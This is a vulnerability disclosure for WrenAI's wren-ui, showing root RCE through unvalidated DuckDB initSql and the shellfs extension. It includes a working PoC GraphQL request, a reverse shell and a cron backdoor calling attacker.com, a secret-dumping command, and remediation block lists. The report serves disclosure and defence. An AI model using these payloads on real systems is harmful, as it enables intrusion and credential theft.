# Security Vulnerability Report: Unauthorized DuckDB InitSQL Leading to Remote Code Execution (RCE)

## Vulnerability Summary

**Vulnerability Type**: Remote Code Execution (RCE) via SQL Injection
**Severity**: 🔴 Critical
**Affected Version**: wren-ui v0.29.3 (potentially affects earlier versions)
**Affected Components**: wren-ui (Apollo GraphQL Server), wren-engine (DuckDB)
**Discovery Date**: 2026-02-04

**Description**:

WrenAI's GraphQL API exposes a `saveDataSource` mutation that allows users to submit arbitrary `initSql` statements when configuring a DuckDB data source. This interface has **no input validation, SQL filtering, or sandbox isolation**. Attackers can exploit DuckDB's `shellfs` extension to execute arbitrary system commands, achieving remote code execution and **complete server takeover**.

**Impact**:
- ✅ Verified exploitable
- ✅ Remote code execution (as root user)
- ✅ Complete server takeover
- Arbitrary file read/write
- Complete database control
- Potential container escape

---

## PoC: Exploitation Demonstration

### Attack Request

```http
POST /api/graphql HTTP/1.1
Host: localhost:3000
Content-Type: application/json

{
  "operationName": "SaveDataSource",
  "variables": {
    "data": {
      "type": "DUCKDB",
      "properties": {
        "displayName": "duckdb",
        "initSql": "install shellfs from community;load shellfs;select * from read_csv_auto('id > /tmp/exec|',HEADER=false, sep='');\n",
        "configurations": {},
        "extensions": []
      }
    }
  },
  "query": "mutation SaveDataSource($data: DataSourceInput!) {\n  saveDataSource(data: $data) {\n    type\n    properties\n    __typename\n  }\n}"
}
```

### Attack Response (Successful)

```http
HTTP/1.1 200 OK
Content-Type: application/json

{
  "data": {
    "saveDataSource": {
      "type": "DUCKDB",
      "properties": {
        "displayName": "duckdb",
        "initSql": "install shellfs from community;load shellfs;select * from read_csv_auto('id > /tmp/exec|',HEADER=false, sep='');\n",
        "configurations": {},
        "extensions": []
      },
      "__typename": "DataSource"
    }
  }
}
```

### Verify RCE Success

```bash
# Check if command execution result file was created
$ docker exec wren-wren-engine-1 ls /tmp
exec
hsperfdata_root
libduckdb_java7081933608497686513.so

# Read command execution result
$ docker exec wren-wren-engine-1 cat /tmp/exec
uid=0(root) gid=0(root) groups=0(root)
```

**Result**: Successfully executed `whoami` command as **root user**, proving complete control of the wren-engine container.

---

## Complete Call Chain

### Architecture Overview

```
User Browser → Wren UI (Next.js :3000)
                ↓ GraphQL POST /api/graphql
              Apollo GraphQL Server
                ↓ saveDataSource Mutation
              ProjectResolver.saveDataSource()
                ↓
              ProjectResolver.buildDuckDbEnvironment()
                ↓
              WrenEngineAdaptor.prepareDuckDB()
                ↓ HTTP POST
              Wren Engine (:8080) /v1/data-source/duckdb
                ↓
              DuckDB executes initSql
                ↓ shellfs extension
              System command execution (whoami > /tmp/exec)
                ↓
              RCE successful (root privileges)
```

### Detailed Call Chain

```
1. User sends GraphQL Mutation
   POST /api/graphql
   Body: {
     operationName: "SaveDataSource",
     variables: {
       data: {
         type: "DUCKDB",
         properties: {
           initSql: "install shellfs from community;load shellfs;select * from read_csv_auto('whoami > /tmp/exec|',...);"
         }
       }
     }
   }
   ↓

2. Apollo GraphQL Server routing
   wren-ui/pages/api/graphql.ts
   ↓

3. GraphQL Resolver
   File: wren-ui/src/apollo/server/resolvers/projectResolver.ts
   Function: ProjectResolver.saveDataSource() (Lines 258-322)
   ↓
   ⚠️ Sink Point 1: Line 265
   const { type, properties } = args.data;
   // User input directly extracted, no validation
   ↓
   ⚠️ Sink Point 2: Line 269
   const { displayName, ...connectionInfo } = properties;
   // connectionInfo contains malicious initSql
   ↓
   Lines 290-296: Detected DuckDB data source
   if (type === DataSourceName.DUCKDB) {
     await this.buildDuckDbEnvironment(ctx, {
       initSql: connectionInfo.initSql,  // ⚠️ Malicious SQL passed
       extensions: connectionInfo.extensions,
       configurations: connectionInfo.configurations,
     });
   }
   ↓

4. buildDuckDbEnvironment() method
   File: wren-ui/src/apollo/server/resolvers/projectResolver.ts
   Function: buildDuckDbEnvironment() (Lines 773-796)
   ↓
   ⚠️ Sink Point 3: Line 781
   const { initSql, extensions, configurations } = options;
   // Receives malicious initSql, no filtering
   ↓
   Line 782: Concatenate extensions
   const initSqlWithExtensions = this.concatInitSql(initSql, extensions);
   ↓
   ⚠️ Sink Point 4: Lines 783-786
   await ctx.wrenEngineAdaptor.prepareDuckDB({
     sessionProps: configurations,
     initSql: initSqlWithExtensions,  // ⚠️ Malicious SQL passed to Engine
   });
   ↓

5. WrenEngineAdaptor
   File: wren-ui/src/apollo/server/adaptors/wrenEngineAdaptor.ts
   Function: prepareDuckDB()
   ↓
   HTTP POST http://wren-engine:8080/v1/data-source/duckdb
   Request Body: {
     "sessionProps": {},
     "initSql": "install shellfs from community;load shellfs;select * from read_csv_auto('whoami > /tmp/exec|',...);"
   }
   ↓

6. Wren Engine (Java application)
   Receives initSql and executes in DuckDB
   ↓

7. DuckDB executes malicious SQL
   Step 1: install shellfs from community;  // Install shellfs extension
   Step 2: load shellfs;                     // Load extension
   Step 3: select * from read_csv_auto('whoami > /tmp/exec|', HEADER=false, sep='');
           // Exploit pipe symbol | to execute system command
   ↓

8. System command execution
   Execute: whoami > /tmp/exec
   Result: Write whoami output to /tmp/exec file
   Privileges: uid=0(root) gid=0(root)  // root user
   ↓

9. RCE successful
   Attacker has complete control of wren-engine container
```

---

## Core Sink Point Analysis

### Sink Point 1: ProjectResolver.saveDataSource()

**File**: `wren-ui/src/apollo/server/resolvers/projectResolver.ts`
**Lines**: 258-322

```typescript
public async saveDataSource(
  _root: any,
  args: {
    data: DataSource;
  },
  ctx: IContext,
) {
  const { type, properties } = args.data;  // ⚠️ Sink Point 1: User input directly extracted
  // Currently only can create one project
  await this.resetCurrentProject(_root, args, ctx);

  const { displayName, ...connectionInfo } = properties;  // ⚠️ Sink Point 2: Extract connectionInfo (contains initSql)
  const project = await ctx.projectService.createProject({
    displayName,
    type,
    connectionInfo,  // ⚠️ Malicious data stored to database
  } as ProjectData);
  logger.debug(`Project created.`);

  // init dashboard
  logger.debug('Dashboard init...');
  await ctx.dashboardService.initDashboard();
  logger.debug('Dashboard created.');

  const eventName = TelemetryEvent.CONNECTION_SAVE_DATA_SOURCE;
  const eventProperties = {
    dataSourceType: type,
  };

  // try to connect to the data source
  try {
    // handle duckdb connection
    if (type === DataSourceName.DUCKDB) {
      connectionInfo as DUCKDB_CONNECTION_INFO;
      await this.buildDuckDbEnvironment(ctx, {
        initSql: connectionInfo.initSql,  // ⚠️ Malicious initSql passed
        extensions: connectionInfo.extensions,
        configurations: connectionInfo.configurations,
      });
    } else {
      // handle other data source
      await ctx.projectService.getProjectDataSourceTables(project);
      // ...
    }
    // telemetry
    ctx.telemetry.sendEvent(eventName, eventProperties);
  } catch (err) {
    // ...
  }
}
```

**Issues**:
- ❌ `properties` directly extracted from GraphQL input, no validation
- ❌ `initSql` has no whitelist or blacklist filtering
- ❌ No checking for dangerous DuckDB extensions (e.g., `shellfs`)
- ❌ No restriction on executable SQL statement types
- ❌ No sandbox isolation mechanism

---

### Sink Point 2: buildDuckDbEnvironment()

**File**: `wren-ui/src/apollo/server/resolvers/projectResolver.ts`
**Lines**: 773-796

```typescript
private async buildDuckDbEnvironment(
  ctx: IContext,
  options: {
    initSql: string;  // ⚠️ Malicious SQL
    extensions: string[];
    configurations: Record<string, any>;
  },
): Promise<void> {
  const { initSql, extensions, configurations } = options;  // ⚠️ Sink Point 3: Receives malicious parameters
  const initSqlWithExtensions = this.concatInitSql(initSql, extensions);
  await ctx.wrenEngineAdaptor.prepareDuckDB({  // ⚠️ Sink Point 4: Passed to Engine
    sessionProps: configurations,
    initSql: initSqlWithExtensions,  // ⚠️ Malicious SQL passed without filtering
  } as DuckDBPrepareOptions);

  // check can list dataset table
  await ctx.wrenEngineAdaptor.listTables();

  // patch wren-engine config
  const config = {
    'wren.datasource.type': 'duckdb',
  };
  await ctx.wrenEngineAdaptor.patchConfig(config);
}
```

**Issues**:
- ❌ `initSql` parameter continues to be passed without validation
- ❌ `concatInitSql()` only concatenates extensions, no security check
- ❌ Directly passed to `wrenEngineAdaptor.prepareDuckDB()`
- ❌ Wren Engine trusts all initSql from UI

---

## Root Causes of Vulnerability

### 1. Missing Input Validation and Filtering

**All code paths lack validation of initSql**:
- projectResolver.ts (Line 265) - Receives user input
- projectResolver.ts (Lines 292-296) - Passes initSql
- projectResolver.ts (Lines 783-786) - Passes to Engine
- wrenEngineAdaptor.ts - Sends to Wren Engine
- Wren Engine - Executes SQL

**Validations that should exist (but are completely missing)**:
- ✗ SQL statement type checking (only allow DDL statements like CREATE TABLE)
- ✗ Dangerous extension blacklist (prohibit `shellfs`, `httpfs`, etc.)
- ✗ Dangerous function blacklist (prohibit pipe symbol usage in `read_csv_auto`)
- ✗ Length limits
- ✗ Special character filtering (e.g., `|`, `;`, `>`, `<`)

### 2. Abuse of DuckDB shellfs Extension

**DuckDB shellfs extension functionality**:
- Allows executing system commands via pipe symbol `|`
- `read_csv_auto('command|', ...)` will execute `command` as a shell command
- Output can be redirected to files or used directly

**Attack principle**:

```sql
-- Install and load shellfs extension
install shellfs from community;
load shellfs;

-- Exploit pipe symbol to execute command
select * from read_csv_auto('whoami > /tmp/exec|', HEADER=false, sep='');
                             ^^^^^^^^^^^^^^^^^^^^
                             This part is executed as shell command
```

### 3. Design Flaw: Over-trusting User Input

- `saveDataSource` interface designed for configuring data sources
- Assumes user is a trusted administrator
- But **has no authentication or authorization checks**
- Anyone can call this interface and submit malicious initSql

### 4. Missing State Check and Re-initialization Protection

**Issues**:
- `saveDataSource` can be **repeatedly called** after project initialization
- No checking if data source is already configured
- No restriction on who can reconfigure data source (**no permission check**)
- Attacker can trigger RCE **at any time**, no need to wait for initialization phase

**Code evidence** (projectResolver.ts:267-268):

```typescript
// Currently only can create one project
await this.resetCurrentProject(_root, args, ctx);
```

This line shows the system will **delete the old project and create a new one**, meaning:
1. Calling `saveDataSource` at any time will trigger `initSql` execution
2. Even if the system is running in production, attackers can still re-initialize
3. No secondary confirmation or administrator permission verification mechanism

**Attack timeline**:

```
Normal workflow:
  T0: Administrator initializes project (legitimate initSql)
  T1: System runs normally for days/months
  T2: Data imported, users actively using the system

Attack workflow:
  T3: Attacker sends malicious saveDataSource request (containing RCE payload)
       ↓
  T4: System calls resetCurrentProject() - deletes old project ⚠️
       ↓
  T5: System creates new project and executes malicious initSql ⚠️
       ↓
  T6: RCE successful, attacker gains root shell ✓
       ↓
  T7: Original project configuration destroyed, potential data loss
```

**Key risk points**:
- ✅ Attack window: **Permanently open** (not limited to initial deployment phase)
- ✅ No need to wait for system restart or redeployment
- ✅ Can destroy production environment at any time
- ✅ Can be used as persistent attack method (repeatedly triggered)
- ✅ Clears existing project configuration (additional destructiveness)

---

## Exploitation Scenarios

### Scenario 1: Reverse Shell

**Attack SQL**:
```sql
install shellfs from community;
load shellfs;
select * from read_csv_auto('bash -c "bash -i >& /dev/tcp/attacker.com/4444 0>&1"|', HEADER=false, sep='');
```

**Result**: Establish reverse shell connection to attacker's server, complete container control

---

### Scenario 2: Read All Environment Variables and Secrets

**Attack SQL**:
```sql
install shellfs from community;
load shellfs;
select * from read_csv_auto('env > /tmp/env.txt|', HEADER=false, sep='');
select * from read_csv_auto('cat /app/config.yaml > /tmp/config.txt|', HEADER=false, sep='');
```

**Result**: Leak database credentials, API keys, JWT secrets, etc.

---

### Scenario 3: Plant Backdoor

**Attack SQL**:
```sql
install shellfs from community;
load shellfs;
select * from read_csv_auto('echo "* * * * * curl http://attacker.com/payload.sh | bash" | crontab -|', HEADER=false, sep='');
```

**Result**: Plant persistent backdoor via cron scheduled tasks

---

## Impact Scope

### Remote Code Execution
- ✅ Verified: Execute arbitrary system commands as root user
- ✅ Verified: File read/write permissions
- ⚠️ Potential: Reverse shell
- ⚠️ Potential: Persistent backdoor

### Data Leakage
- ⚠️ Potential: Read all files in container (configs, secrets, code)
- ⚠️ Potential: Export entire database
- ⚠️ Potential: Steal environment variables (database credentials, API keys)

### Service Destruction
- ⚠️ Potential: Delete critical files
- ⚠️ Potential: Terminate service processes
- ⚠️ Potential: Consume all resources (CPU, memory, disk)

### Lateral Movement
- ⚠️ Potential: Attack other internal services (if container has network access)
- ⚠️ Potential: Use container credentials to access cloud services (AWS, GCP, Azure)

---

## Remediation Recommendations (For Developer Reference)

### Immediate Actions (Critical)

1. **Disable initSql functionality or add strict whitelist**
   ```typescript
   // Option 1: Completely disable
   if (connectionInfo.initSql) {
     throw new Error('initSql is not allowed for security reasons');
   }
   
   // Option 2: Only allow safe DDL statements
   const ALLOWED_SQL_PATTERNS = [
     /^CREATE TABLE /i,
     /^CREATE VIEW /i,
   ];
   
   if (initSql && !ALLOWED_SQL_PATTERNS.some(pattern => pattern.test(initSql))) {
     throw new Error('Only CREATE TABLE and CREATE VIEW statements are allowed');
   }
   ```

2. **Prohibit dangerous DuckDB extensions**
   ```typescript
   const DANGEROUS_EXTENSIONS = ['shellfs', 'httpfs'];
   const DANGEROUS_KEYWORDS = ['install', 'load', 'read_csv_auto', '|', '>', '<'];
   
   const sqlLower = initSql.toLowerCase();
   for (const ext of DANGEROUS_EXTENSIONS) {
     if (sqlLower.includes(ext)) {
       throw new Error(`Dangerous extension detected: ${ext}`);
     }
   }
   
   for (const keyword of DANGEROUS_KEYWORDS) {
     if (initSql.includes(keyword)) {
       throw new Error(`Dangerous keyword detected: ${keyword}`);
     }
   }
   ```

3. **Add authentication and authorization checks**
   ```typescript
   // saveDataSource should only be callable by administrators
   if (!ctx.user || !ctx.user.isAdmin) {
     throw new Error('Only administrators can configure data sources');
   }
   ```

4. **Lower Wren Engine running privileges**
   - Modify Dockerfile to run as non-root user
   - Add seccomp profile to restrict system calls
   - Use read-only filesystem (except necessary temp directories)

---

## Test Environment

- wren-ui: v0.29.3
- wren-engine: v0.29.3

---

